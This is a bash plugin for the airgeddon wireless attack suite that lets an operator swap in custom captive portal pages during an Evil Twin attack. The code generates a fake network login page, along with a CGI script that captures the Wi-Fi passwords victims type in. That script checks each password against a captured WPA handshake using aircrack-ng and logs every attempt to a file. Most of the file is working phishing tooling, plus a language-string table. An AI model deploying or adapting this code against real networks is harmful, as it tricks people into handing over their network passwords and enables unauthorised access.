#!/usr/bin/env bash

# Custom-Portals airgeddon plugin

# Version:    0.1.6
# Author:     KeyofBlueS
# Repository: https://github.com/KeyofBlueS/airgeddon-plugins
# License:    GNU General Public License v3.0, https://opensource.org/licenses/GPL-3.0

# airgeddon Repository: https://github.com/v1s1t0r1sh3r3/airgeddon

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Custom-Portals"
plugin_description="Use Your own captive portals"
plugin_author="KeyofBlueS"

plugin_enabled=1

plugin_minimum_ag_affected_version="10.30"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

################################# USER CONFIG SECTION #################################

# Put Your custom captive portal files in a directory of Your choice
# Default is plugins/custom_portals/PORTAL_FOLDER/PORTAL_FILES
# Example:
custom_portals_dir="${scriptfolder}${plugins_dir}custom_portals/"
# You can have multiple PORTAL_FOLDER, then choose one of them inside airgeddon itself.
# Including ESSID_HERE in the body of Your custom index file, will be replaced with the
# essid of the target network.
# Including TITLE_HERE in the body of Your custom index file, will be replaced with the
# title in the chosen language. It's recommended to not customize title as, in my
# experience, this will prevent clients to correctly detect a captive portal, so please
# consider to use TITLE_HERE in order to set the default one, unless You know what You
# are doing.
# Take a look at custom_portals/OpenWRT_EXAMPLE for a custom captive portal example.

# *** WARNING ***
# Enabling the detection of passwords containing *&/?<> characters is very dangerous as
# injections can be done on captive portal page and the hacker could be hacked by some
# kind of command injection on the captive portal page.
# Set to "true" AT YOUR OWN RISK!
custom_portals_full_password=false

############################## END OF USER CONFIG SECTION ##############################

#Copy custom captive portal files.
function custom_portals_override_set_captive_portal_page() {

	debug_print

	if [[ "${copy_custom_portal}" -eq "1" ]]; then
		cp -r "${custom_portals_dir}${custom_portal}/"* "${tmpdir}${webdir}"
		unset copy_custom_portal
	fi

	if [[ "${custom_portals_full_password}" = "true" ]]; then
		echo
		language_strings "${language}" "custom_portals_text_6" "red"
	fi

	if [[ ! -f "${tmpdir}${webdir}${cssfile}" ]]; then
		{
		echo -e "body * {"
		echo -e "\tbox-sizing: border-box;"
		echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
		echo -e "}\n"
		echo -e ".button {"
		echo -e "\tcolor: #ffffff;"
		echo -e "\tbackground-color: #1b5e20;"
		echo -e "\tborder-radius: 5px;"
		echo -e "\tcursor: pointer;"
		echo -e "\theight: 30px;"
		echo -e "}\n"
		echo -e ".content {"
		echo -e "\twidth: 100%;"
		echo -e "\tbackground-color: #43a047;"
		echo -e "\tpadding: 20px;"
		echo -e "\tmargin: 15px auto 0;"
		echo -e "\tborder-radius: 15px;"
		echo -e "\tcolor: #ffffff;"
		echo -e "}\n"
		echo -e ".title {"
		echo -e "\ttext-align: center;"
		echo -e "\tmargin-bottom: 15px;"
		echo -e "}\n"
		echo -e "#password {"
		echo -e "\twidth: 100%;"
		echo -e "\tmargin-bottom: 5px;"
		echo -e "\tborder-radius: 5px;"
		echo -e "\theight: 30px;"
		echo -e "}\n"
		echo -e "#password:hover,"
		echo -e "#password:focus {"
		echo -e "\tbox-shadow: 0 0 10px #69f0ae;"
		echo -e "}\n"
		echo -e ".bold {"
		echo -e "\tfont-weight: bold;"
		echo -e "}\n"
		echo -e "#showpass {"
		echo -e "\tvertical-align: top;"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${cssfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${jsfile}" ]]; then
		{
		echo -e "(function() {\n"
		echo -e "\tvar onLoad = function() {"
		echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
		echo -e "\t\tif (formElement != null) {"
		echo -e "\t\t\tvar password = document.getElementById(\"password\");"
		echo -e "\t\t\tvar showpass = function() {"
		echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
		echo -e "\t\t\tvar validatepass = function() {"
		echo -e "\t\t\t\tif (password.value.length < 8) {"
		echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t\telse {"
		echo -e "\t\t\t\t\tformElement.submit();"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
		echo -e "\t\t}"
		echo -e "\t};\n"
		echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
		echo -e "})();\n"
		echo -e "function redirect() {"
		echo -e "\tdocument.location = \"${indexfile}\";"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${jsfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${indexfile}" ]]; then
		{
		echo -e "#!/usr/bin/env bash"
		echo -e "echo '<!DOCTYPE html>'"
		echo -e "echo '<html>'"
		echo -e "echo -e '\t<head>'"
		echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
		echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
		echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
		echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
		echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
		echo -e "echo -e '\t</head>'"
		echo -e "echo -e '\t<body>'"
		echo -e "echo -e '\t\t<div class=\"content\">'"
		echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
		echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
		echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
		echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
		echo -e "echo -e '\t\t\t\t</div>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
		echo -e "echo -e '\t\t\t\t<label>'"
		echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
		echo -e "echo -e '\t\t\t\t</label>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
		echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
		echo -e "echo -e '\t\t\t</form>'"
		echo -e "echo -e '\t\t</div>'"
		echo -e "echo -e '\t</body>'"
		echo -e "echo '</html>'"
		echo -e "exit 0"
		} >> "${tmpdir}${webdir}${indexfile}"
	else
		if cat "${tmpdir}${webdir}${indexfile}" | grep -q "ESSID_HERE"; then
			if echo "${essid}" | grep -Fq "&"; then
				essid=$(echo "${essid}" | sed -e 's/[\/&]/\\&/g')
			fi
			sed -i "s/ESSID_HERE/${essid//[\`\']/}/g" "${tmpdir}${webdir}${indexfile}"
		fi
		if cat "${tmpdir}${webdir}${indexfile}" | grep -q "TITLE_HERE"; then
			sed -i "s/TITLE_HERE/${et_misc_texts[${captive_portal_language},15]}/g" "${tmpdir}${webdir}${indexfile}"
		fi
	fi

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/usr/bin/env bash
		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'
	EOF

	if [[ "${custom_portals_full_password}" = "true" ]]; then
		cat >&4 <<-'EOF'
			POST_DATA=$(cat /dev/stdin)
			if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
				POST_DATA=${POST_DATA#*=}
				password=${POST_DATA/+/ }
				password=${password//[]}
				password=$(printf '%b' "${password//%/\\x}")
				password=${password//[]}
			fi
			if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
		EOF
	else
		cat >&4 <<-'EOF'
			POST_DATA=$(cat /dev/stdin)
			if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
				POST_DATA=${POST_DATA#*=}
				password=${POST_DATA/+/ }
				password=${password//[*&\/?<>]}
				password=$(printf '%b' "${password//%/\\x}")
				password=${password//[*&\/?<>]}
			fi
			if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
		EOF
	fi

	cat >&4 <<-EOF
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
	EOF

	cat >&4 <<-'EOF'
			echo "${password}" >\
	EOF

	cat >&4 <<-EOF
			"${tmpdir}${webdir}${currentpassfile}"
			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
	EOF

	cat >&4 <<-'EOF'
			if [ "$?" = "0" ]; then
	EOF

	cat >&4 <<-EOF
				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
	EOF

	cat >&4 <<-'EOF'
				echo "${password}" >>\
	EOF

	cat >&4 <<-EOF
				"${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
	EOF

	cat >&4 <<-'EOF'
		elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
	EOF

	cat >&4 <<-EOF
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi
		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'
	EOF

	cat >&4 <<-'EOF'
		if [ ${et_successful} -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}

#Custom captive portal selection menu
function custom_portals_prehook_set_captive_portal_language() {

	debug_print

	standard_portal_text="this_is_the_standard_portal_text"
	while true; do
		clear
		language_strings "${language}" 293 "title"
		print_iface_selected
		print_et_target_vars
		print_iface_internet_selected
		echo
		language_strings "${language}" "custom_portals_text_0" "green"
		print_simple_separator

		echo "${standard_portal_text}" > "${tmpdir}ag.custom_portals.txt"
		ls -d1 -- "${custom_portals_dir}"*/ 2>/dev/null | rev | awk -F'/' '{print $2}' | rev | sort >> "${tmpdir}ag.custom_portals.txt"
		local i=1
		while IFS=, read -r exp_folder; do

			if [[ -d "${custom_portals_dir}${exp_folder}" ]] || [[ "${exp_folder}" = "${standard_portal_text}" ]]; then
				if [[ "${exp_folder}" = "${standard_portal_text}" ]]; then
					language_strings "${language}" "custom_portals_text_1"
				else
					i=$((i + 1))

					if [ ${i} -le 9 ]; then
						sp1=" "
					else
						sp1=""
					fi

					portal=${exp_folder}
					echo -e "${sp1}${i}) ${portal}"
				fi
			fi
		done < "${tmpdir}ag.custom_portals.txt"

		unset selected_custom_portal
		echo
		if ! cat "${tmpdir}ag.custom_portals.txt" | grep -Exvq "${standard_portal_text}$"; then
			language_strings "${language}" "custom_portals_text_2" "yellow"
			language_strings "${language}" "custom_portals_text_3" "yellow"
			echo_brown "${custom_portals_dir}PORTAL_FOLDER/PORTAL_FILES"
		fi
		read -rp "> " selected_custom_portal
		if [[ ! "${selected_custom_portal}" =~ ^[[:digit:]]+$ ]] || [[ "${selected_custom_portal}" -gt "${i}" ]] || [[ "${selected_custom_portal}" -lt 1 ]]; then
			echo
			language_strings "${language}" "custom_portals_text_4" "red"
			language_strings "${language}" 115 "read"
		else
			break
		fi
	done
	if [[ "${selected_custom_portal}" -eq 1 ]]; then
		copy_custom_portal=0
	else
		copy_custom_portal=1
	fi
	custom_portal="$(sed -n "${selected_custom_portal}"p "${tmpdir}ag.custom_portals.txt")"
	rm "${tmpdir}ag.custom_portals.txt"
	language_strings "${language}" "custom_portals_text_5" "yellow"
	echo_yellow "${custom_portal}"
	language_strings "${language}" 115 "read"
}

#Custom function. Create text messages to be used in custom portals plugin
function initialize_custom_portals_language_strings() {

	debug_print

	declare -gA arr
	arr["ENGLISH","custom_portals_text_0"]="Select Your captive portal:"
	arr["SPANISH","custom_portals_text_0"]="\${pending_of_translation} Seleccione su portal cautivo:"
	arr["FRENCH","custom_portals_text_0"]="\${pending_of_translation} Sélectionnez votre portail captif:"
	arr["CATALAN","custom_portals_text_0"]="\${pending_of_translation} Seleccioneu el vostre portal en captivitat:"
	arr["PORTUGUESE","custom_portals_text_0"]="\${pending_of_translation} Selecione Seu portal cativo:"
	arr["RUSSIAN","custom_portals_text_0"]="\${pending_of_translation} Выберите свой портал:"
	arr["GREEK","custom_portals_text_0"]="\${pending_of_translation} Επιλέξτε την δεσμευμένη πύλη σας:"
	arr["ITALIAN","custom_portals_text_0"]="Seleziona il captive portal:"
	arr["POLISH","custom_portals_text_0"]="\${pending_of_translation} Wybierz swój portal dla niewoli:"
	arr["GERMAN","custom_portals_text_0"]="\${pending_of_translation} Wählen Sie Ihr Captive-Portal aus:"
	arr["TURKISH","custom_portals_text_0"]="\${pending_of_translation} Esir portalınızı seçin:"
	arr["ARABIC","custom_portals_text_0"]="\${pending_of_translation} حدد البوابة المقيدة الخاصة بك"

	arr["ENGLISH","custom_portals_text_1"]=" 1) Standard"
	arr["SPANISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Estándar"
	arr["FRENCH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["CATALAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Estàndard"
	arr["PORTUGUESE","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Padrão"
	arr["RUSSIAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} стандарт"
	arr["GREEK","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Πρότυπο"
	arr["ITALIAN","custom_portals_text_1"]=" 1) Standard"
	arr["POLISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["GERMAN","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standard"
	arr["TURKISH","custom_portals_text_1"]=" 1) \${cyan_color}\${pending_of_translation}\${normal_color} Standart"
	arr["ARABIC","custom_portals_text_1"]="\${pending_of_translation} 1) اساسي"

	arr["ENGLISH","custom_portals_text_2"]="No custom captive portals found!"
	arr["SPANISH","custom_portals_text_2"]="\${pending_of_translation} ¡No se encontraron portales cautivos personalizados!"
	arr["FRENCH","custom_portals_text_2"]="\${pending_of_translation} Aucun portail captif personnalisé trouvé!"
	arr["CATALAN","custom_portals_text_2"]="\${pending_of_translation} No s’han trobat portals en captivitat personalitzats!"
	arr["PORTUGUESE","custom_portals_text_2"]="\${pending_of_translation} Não foram encontrados portais cativos personalizados!"
	arr["RUSSIAN","custom_portals_text_2"]="\${pending_of_translation} Не найдено ни одного пользовательского портала!"
	arr["GREEK","custom_portals_text_2"]="\${pending_of_translation} Δεν βρέθηκαν προσαρμοσμένες πύλες δέσμιας!"
	arr["ITALIAN","custom_portals_text_2"]="Nessun captive portal personalizzato trovato!"
	arr["POLISH","custom_portals_text_2"]="\${pending_of_translation} Nie znaleziono niestandardowych portali typu captive!"
	arr["GERMAN","custom_portals_text_2"]="\${pending_of_translation} Keine benutzerdefinierten Captive-Portale gefunden!"
	arr["TURKISH","custom_portals_text_2"]="\${pending_of_translation} Özel sabit portal bulunamadı!"
	arr["ARABIC","custom_portals_text_2"]="\${pending_of_translation} لم يتم العثور على بوابات مقيدة مخصصة"

	arr["ENGLISH","custom_portals_text_3"]="Please put Your custom captive portal files in:"
	arr["SPANISH","custom_portals_text_3"]="\${pending_of_translation} Coloque sus archivos de portal cautivo personalizados en:"
	arr["FRENCH","custom_portals_text_3"]="\${pending_of_translation} Veuillez placer vos fichiers de portail captif personnalisés dans:"
	arr["CATALAN","custom_portals_text_3"]="\${pending_of_translation} Si us plau, introduïu els fitxers de portal personalitzat en captivitat a:"
	arr["PORTUGUESE","custom_portals_text_3"]="\${pending_of_translation} Coloque seus arquivos de portal em cativeiro personalizados em:"
	arr["RUSSIAN","custom_portals_text_3"]="\${pending_of_translation} Пожалуйста, поместите Ваши пользовательские файлы портала в:"
	arr["GREEK","custom_portals_text_3"]="\${pending_of_translation} Τοποθετήστε τα προσαρμοσμένα αρχεία της πύλης δεσμευμένων σε:"
	arr["ITALIAN","custom_portals_text_3"]="Inserisci i file dei captive portal personalizzati in:"
	arr["POLISH","custom_portals_text_3"]="\${pending_of_translation} Proszę umieścić własne niestandardowe pliki portalu w:"
	arr["GERMAN","custom_portals_text_3"]="\${pending_of_translation} Bitte legen Sie Ihre benutzerdefinierten Captive-Portal-Dateien in:"
	arr["TURKISH","custom_portals_text_3"]="\${pending_of_translation} Lütfen özel esir portal dosyalarınızı buraya yerleştirin:"
	arr["ARABIC","custom_portals_text_3"]="\${pending_of_translation} يرجى وضع ملفات المدخل المقيدة المخصصة الخاصة بك في"

	arr["ENGLISH","custom_portals_text_4"]="Invalid captive portal was chosen!"
	arr["SPANISH","custom_portals_text_4"]="\${pending_of_translation} ¡Se eligió el portal cautivo no válido!"
	arr["FRENCH","custom_portals_text_4"]="\${pending_of_translation} Un portail captif non valide a été choisi!"
	arr["CATALAN","custom_portals_text_4"]="\${pending_of_translation} El portal captiu no és vàlid!"
	arr["PORTUGUESE","custom_portals_text_4"]="\${pending_of_translation} Portal cativo inválido foi escolhido!"
	arr["RUSSIAN","custom_portals_text_4"]="\${pending_of_translation} Выбран неверный портал!"
	arr["GREEK","custom_portals_text_4"]="\${pending_of_translation} Επιλέχθηκε μη έγκυρη πύλη αιχμαλωσίας!"
	arr["ITALIAN","custom_portals_text_4"]="Scelta non valida!"
	arr["POLISH","custom_portals_text_4"]="\${pending_of_translation} Wybrano nieprawidłowy portal dla niewoli!"
	arr["GERMAN","custom_portals_text_4"]="\${pending_of_translation} Es wurde ein ungültiges Captive-Portal ausgewählt!"
	arr["TURKISH","custom_portals_text_4"]="\${pending_of_translation} Geçersiz esir portal seçildi!"
	arr["ARABIC","custom_portals_text_4"]="\${pending_of_translation} تم اختيار بوابة مقيدة غير صالحة"

	arr["ENGLISH","custom_portals_text_5"]="Captive portal choosen:"
	arr["SPANISH","custom_portals_text_5"]="\${pending_of_translation} Portal cautivo elegido:"
	arr["FRENCH","custom_portals_text_5"]="\${pending_of_translation} Portail captif choisi:"
	arr["CATALAN","custom_portals_text_5"]="\${pending_of_translation} Portal captiu escollit:"
	arr["PORTUGUESE","custom_portals_text_5"]="\${pending_of_translation} Portal cativo escolhido:"
	arr["RUSSIAN","custom_portals_text_5"]="\${pending_of_translation} Пленный портал выбран:"
	arr["GREEK","custom_portals_text_5"]="\${pending_of_translation} Επιλεγμένη πύλη αιχμαλωσίας:"
	arr["ITALIAN","custom_portals_text_5"]="Captive portal selezionato:"
	arr["POLISH","custom_portals_text_5"]="\${pending_of_translation} Wybrany portal dla niewoli:"
	arr["GERMAN","custom_portals_text_5"]="\${pending_of_translation} Captive Portal ausgewählt:"
	arr["TURKISH","custom_portals_text_5"]="\${pending_of_translation} Seçilen esir portalı:"
	arr["ARABIC","custom_portals_text_5"]="\${pending_of_translation} تم اختيار بوابة مقيدة"

	arr["ENGLISH","custom_portals_text_6"]="WARNING: detection of passwords containing *&/?<> characters is ENABLED!"
	arr["SPANISH","custom_portals_text_6"]="\${pending_of_translation} ADVERTENCIA: ¡la detección de contraseñas que contienen caracteres *&/?<> Está HABILITADA!"
	arr["FRENCH","custom_portals_text_6"]="\${pending_of_translation} ATTENTION: la détection des mots de passe contenant des caractères *&/?<> Est ACTIVÉE!"
	arr["CATALAN","custom_portals_text_6"]="\${pending_of_translation} ADVERTIMENT: la detecció de contrasenyes que contenen caràcters *&/?<> Està habilitada!"
	arr["PORTUGUESE","custom_portals_text_6"]="\${pending_of_translation} AVISO: a detecção de senhas que contêm caracteres *&/?<> Está ATIVADA!"
	arr["RUSSIAN","custom_portals_text_6"]="\${pending_of_translation} ВНИМАНИЕ: обнаружение паролей, содержащих символы *&/?<> ВКЛЮЧЕНО!"
	arr["GREEK","custom_portals_text_6"]="\${pending_of_translation} ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η ανίχνευση κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> ΕΝΕΡΓΟΠΟΙΗΘΕΙ!"
	arr["ITALIAN","custom_portals_text_6"]="ATTENZIONE: il rilevamento di password contenenti caratteri *&/?<> È ABILITATO!"
	arr["POLISH","custom_portals_text_6"]="\${pending_of_translation} OSTRZEŻENIE: wykrywanie haseł zawierających znaki *&/?<> Jest WŁĄCZONE!"
	arr["GERMAN","custom_portals_text_6"]="\${pending_of_translation} WARNUNG: Die Erkennung von Passwörtern mit *&/?<> Zeichen ist AKTIVIERT!"
	arr["TURKISH","custom_portals_text_6"]="\${pending_of_translation} UYARI: *&/?<> Karakterleri içeren şifrelerin tespiti ETKİN!"
	arr["ARABIC","custom_portals_text_6"]="\${pending_of_translation} تحذير: تم تمكين اكتشاف كلمات المرور التي تحتوي على * & /؟ <> أحرف"
}

initialize_custom_portals_language_strings
